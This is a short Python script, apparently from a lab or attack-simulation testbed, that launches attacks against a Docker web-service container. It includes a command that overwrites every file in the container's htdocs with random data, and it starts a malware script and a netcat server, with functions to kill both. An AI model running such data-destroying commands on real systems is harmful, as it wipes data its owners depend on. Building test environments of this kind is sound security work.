import asyncio
import logging
import os

logger = logging.getLogger(__name__)



#Last attack - destroy the container content
async def integrity_attack():
    logging.info("start integrity attack")
    return await asyncio.create_subprocess_shell('docker exec exame-web-service-only-json find ./htdocs -type f -exec dd if=/dev/urandom of={} bs=100 count=102400 \\;', stdout=asyncio.subprocess.PIPE, stdin=asyncio.subprocess.PIPE)

async def malware_attack_client():
    logging.info("start malware attack")
    return await asyncio.create_subprocess_shell('docker exec exame-web-service-only-json "/malware.sh"', stdout=asyncio.subprocess.PIPE,stdin=asyncio.subprocess.PIPE)


async def malware_attack_server():
    logging.info("start netcat server")
    #os.system('./script/Attack/netcat_server.sh')
    return await asyncio.create_subprocess_exec(os.getcwd()+'/attack/netcat_server.sh', stdout=asyncio.subprocess.PIPE, stdin=asyncio.subprocess.PIPE)

async def malware_attack_client_kill():
    logging.info("kill malware attack")

    return await asyncio.create_subprocess_shell('docker exec exame-web-service-only-json bash -c "kill $(docker exec exame-web-service-only-json pidof -x malware.sh)"') 

async def malware_integrity_attack_kill():
    logging.info("kill integrity attack")

    return await asyncio.create_subprocess_shell('docker exec exame-web-service-only-json bash -c "kill $(docker exec exame-web-service-only-json pidof -x find)"') 
